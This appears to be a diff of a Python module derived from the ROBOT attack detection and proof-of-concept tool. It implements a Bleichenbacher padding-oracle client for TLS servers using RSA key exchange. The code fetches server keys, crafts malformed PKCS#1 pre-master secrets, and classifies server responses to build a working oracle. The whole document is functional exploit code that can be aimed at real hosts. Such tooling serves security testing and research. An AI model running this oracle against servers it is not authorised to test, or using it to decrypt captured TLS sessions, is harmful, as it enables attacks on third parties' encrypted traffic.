@@ -1,15 +1,15 @@
 # Code based on https://github.com/robotattackorg/robot-detect/blob/master/robot-detect:
 # > Detection and proof of concept for the ROBOT attack
 # > https://robotattack.org/
-# > 
+# >
 # > This code is licensed as CC0.
 
-import reversebleichenbacher.oracle as oracle
-
-# TODO: this really needs cleanup!!!
-
+import ssl
 import socket
 from concurrent.futures import ProcessPoolExecutor, as_completed
+from cryptography import x509
+from cryptography.hazmat.backends import default_backend
+from Crypto.Random import get_random_bytes
 import gmpy2
 
 
@@ -37,9 +37,9 @@ enable_fastopen = False # True # os.path.exists("/proc/sys/net/ipv4/tcp_fastopen
 def global_recv_n(s, amount):
         data = b""
         while len(data) < amount:
-            data += s.recv(amount - len(data)) 
+            data += s.recv(amount - len(data))
         return data
-    
+
 def global_recv_record(s):
     header = global_recv_n(s, 5)
     data = global_recv_n(s, header[3] * 256 + header[4])
@@ -51,31 +51,31 @@ def global__query(pre_master_secret, message_flow, ip, port, client_hello, serve
     s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     if not enable_fastopen:
         s.connect((ip, port))
-    
+
     data = b""
-    data += client_hello 
-    
-    data += b"\x16" + server_version 
+    data += client_hello
+
+    data += b"\x16" + server_version
     data += client_key_exchange_prefix + pre_master_secret
-    
+
     if not message_flow:
         data += b"\x14" + server_version + ccs
         data += b"\x16" + server_version + enc
-    
+
     try:
         if enable_fastopen:
             s.sendto(data, MSG_FASTOPEN, (ip, port))
         else:
             s.sendall(data)
         s.shutdown(socket.SHUT_WR)
-            
+
         # receive responses for client hello (we receive all records until a server hello done = 0x0e is received)
         data = b""
         while len(data) < 1 or data[0] != 0x0e:
             _, data = global_recv_record(s)
-        
+
         alert = s.recv(4096)
-        
+
         if len(alert) == 0:
             return "No data received from server"
         if alert[0] == 0x15:
@@ -100,10 +100,12 @@ def global_query(number, e, N, C, modulus_bits, good, message_flow, ip, port, cl
     pms = bytearray.fromhex(tmp)
     return global__query(pms, message_flow, ip, port, client_hello, server_version, client_key_exchange_prefix) == good
 
-class TLSOracle(oracle.Oracle):
-    
+class TLSOracle:
+
     def __init__(self, config, ip, port, client_hello, client_key_exchange_prefix, e, N, C):
-        super().__init__(config)
+        self.config = config
+        self.calls = 0
+        self.round_trips = 0
         self.ip = ip
         self.port = port
         self.client_hello = client_hello
@@ -119,12 +121,12 @@ class TLSOracle(oracle.Oracle):
         self.C = C
         if self.server_version is None:
             raise Exception("failed to get TLS version from server!")
-            
+
         # get fast-open cookie
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
         s.close()
-    
+
     def _find_server_version(self):
         # only get server tls version once
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -138,18 +140,18 @@ class TLSOracle(oracle.Oracle):
             return msg[9:11] # bytes that indicate server version
         finally:
             s.close()
-    
+
     def _recv_n(self, s, amount):
         data = b""
         while len(data) < amount:
-            data += s.recv(amount - len(data)) 
+            data += s.recv(amount - len(data))
         return data
-    
+
     def _recv_record(self, s):
         header = self._recv_n(s, 5)
         data = self._recv_n(s, header[3] * 256 + header[4])
         return header, data
-    
+
     def _query(self, pre_master_secret, message_flow=None):
         global ccs, enc, enable_fastopen, MSG_FASTOPEN
         if message_flow is None:
@@ -160,26 +162,26 @@ class TLSOracle(oracle.Oracle):
             s.connect((self.ip, self.port))
 
         data = b""
-        data += self.client_hello 
-        
-        data += b"\x16" + self.server_version 
+        data += self.client_hello
+
+        data += b"\x16" + self.server_version
         data += self.client_key_exchange_prefix + pre_master_secret
-        
-        if not self.message_flow:
+
+        if not message_flow:
             data += b"\x14" + self.server_version + ccs
             data += b"\x16" + self.server_version + enc
-        
+
         try:
             if enable_fastopen:
                 s.sendto(data, MSG_FASTOPEN, (self.ip, self.port))
             else:
-                s.sendall(data)    
+                s.sendall(data)
             s.shutdown(socket.SHUT_WR)
             # receive responses for client hello (we receive all records until a server hello done = 0x0e is received)
             data = b""
             while len(data) < 1 or data[0] != 0x0e:
                 _, data = self._recv_record(s)
-            
+
             alert = s.recv(4096)
             if len(alert) == 0:
                 return "No data received from server"
@@ -198,12 +200,12 @@ class TLSOracle(oracle.Oracle):
         finally:
             s.close()
         return ""
-    
+
     def _count(self):
         self.calls = self.calls + 1
         if self.calls % 1000 == 0:
             print(self.calls, "oracle queries")
-    
+
     def query_raw(self, pre_master_secret, message_flow=None, count=True):
         if count:
             self._count()
@@ -218,8 +220,8 @@ class TLSOracle(oracle.Oracle):
         tmp = hex(cc).rstrip("L").lstrip("0x").rjust(self.modulus_bits // 4, '0')
         pms = bytearray.fromhex(tmp)
         return self.query_raw(pms, count=False) == self.good
-    
-    
+
+
     def submit(self, work):
         self.round_trips += (len(work) + self.workers - 1) // self.workers
         work_queue = list()
@@ -230,13 +232,128 @@ class TLSOracle(oracle.Oracle):
             future.extra = extra
             work_queue.append(future)
         return work_queue
-    
+
     def cancel(self, work_queue):
         for work in work_queue:
             work.cancel()
-    
+
     def as_completed(self, work_queue):
         for fut in as_completed(work_queue):
             if fut.cancelled():
                 continue
             yield fut.extra, fut.result()
+
+
+class RSAPublicKey:
+    def __init__(self, N, e):
+        self.N = N
+        self.e = e
+        self.bits = ceil_div(N.bit_length(), 8) * 8
+        self.B = 1 << (8 * (self.bits // 8 - 2))
+
+
+def ceil_div(a, b):
+    return -(-a // b)
+
+
+def make_cke_prefix(rsa):
+    modulus_bytes = ceil_div(rsa.N.bit_length(), 8)
+    return bytearray.fromhex(
+        "{0:0{1}x}".format(modulus_bytes + 6, 4)
+        + "10"
+        + "{0:0{1}x}".format(modulus_bytes + 2, 6)
+        + "{0:0{1}x}".format(modulus_bytes, 4)
+    )
+
+
+def get_rsa_from_server(server, port):
+    try:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        ctx.set_ciphers("RSA")
+        raw_socket = socket.socket()
+        s = ctx.wrap_socket(raw_socket)
+        s.connect((server, port))
+        cert_raw = s.getpeercert(binary_form=True)
+        cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
+        s.close()
+        return RSAPublicKey(cert_dec.public_key().public_numbers().n, cert_dec.public_key().public_numbers().e)
+    except ssl.SSLError as e:
+        print("Cannot connect to server: %s" % e)
+        print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
+        s.close()
+        quit()
+    except (ConnectionRefusedError, socket.timeout) as e:
+        print("Cannot connect to server: %s" % e)
+        print("There seems to be no TLS on this host/port.")
+        quit()
+
+def configure_oracle(oracle, rsa, quiet=False, test=False):
+    rsa_bytelen = ceil_div(rsa.bits, 8)
+    random_bytes_no_zero = b""
+    while len(random_bytes_no_zero) < rsa_bytelen:
+        b = get_random_bytes(1)
+        if b != b"\x00":
+            random_bytes_no_zero += b
+
+    pms = random_bytes_no_zero[-46:]
+
+    pms_ok = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x03\x03" + pms
+    pms_ok = int.from_bytes(pms_ok, "big")
+    c_ok   = pow(pms_ok, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
+    r_ok = oracle.query_raw(c_ok, message_flow = False)
+    oracle.good = r_ok
+
+    if test:
+        pms_no_zero         = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x11" + b"\x03\x03" + pms
+        pms_wrong_zero      = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x11" + pms + b"\x00\x11"
+        pms_wrong_version   = bytes([0x00, 0x02]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x02\x02" + pms
+        pms_wrong_pad       = bytes([0x01, 0x01]) + random_bytes_no_zero[:rsa_bytelen - 46 - 2 - 1 - 2] + b"\x00" + b"\x03\x03" + pms
+
+        pms_no_zero         = int.from_bytes(pms_no_zero, "big")
+        pms_wrong_zero      = int.from_bytes(pms_wrong_zero, "big")
+        pms_wrong_version   = int.from_bytes(pms_wrong_version, "big")
+        pms_wrong_pad       = int.from_bytes(pms_wrong_pad, "big")
+
+        c_no_zero           = pow(pms_no_zero, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
+        c_wrong_zero        = pow(pms_wrong_zero, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
+        c_wrong_version     = pow(pms_wrong_version, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
+        c_wrong_pad         = pow(pms_wrong_pad, rsa.e, rsa.N).to_bytes(rsa_bytelen, "big")
+
+        r_no_zero = oracle.query_raw(c_no_zero, message_flow = False)
+        r_wrong_zero = oracle.query_raw(c_wrong_zero, message_flow = False)
+        r_wrong_version = oracle.query_raw(c_wrong_version, message_flow = False)
+        r_wrong_pad = oracle.query_raw(c_wrong_pad, message_flow = False)
+
+        if not quiet:
+            print("Normal message flow:")
+            print("Result of good request:                 ", r_ok)
+            print("Result of bad request 1 (wrong pad):    ", r_wrong_pad)
+            print("Result of bad request 2 (wrong zero):   ", r_wrong_zero)
+            print("Result of bad request 3 (no zero):      ", r_no_zero)
+            print("Result of bad request 4 (wrong version):", r_wrong_version)
+
+        rm_ok = oracle.query_raw(c_ok, message_flow = True)
+        rm_no_zero = oracle.query_raw(c_no_zero, message_flow = True)
+        rm_wrong_zero = oracle.query_raw(c_wrong_zero, message_flow = True)
+        rm_wrong_version = oracle.query_raw(c_wrong_version, message_flow = True)
+        rm_wrong_pad = oracle.query_raw(c_wrong_pad, message_flow = True)
+
+        if not quiet:
+            print("Alternative flow:")
+            print("Result of good request:                 ", rm_ok)
+            print("Result of bad request 1 (wrong pad):    ", rm_wrong_pad)
+            print("Result of bad request 2 (wrong zero):   ", rm_wrong_zero)
+            print("Result of bad request 3 (no zero):      ", rm_no_zero)
+            print("Result of bad request 4 (wrong version):", rm_wrong_version)
+        if (r_ok == r_no_zero == r_wrong_zero == r_wrong_version == r_wrong_pad):
+            oracle.message_flow = True
+            oracle.good = rm_ok
+            if (rm_ok == rm_no_zero == rm_wrong_zero == rm_wrong_version == rm_wrong_pad):
+                raise Exception("No Bleichenbacher Oracle detected!")
+            if not quiet:
+                print("Using alternative message flow!")
+        else:
+            if not quiet:
+                print("Using normal message flow!")
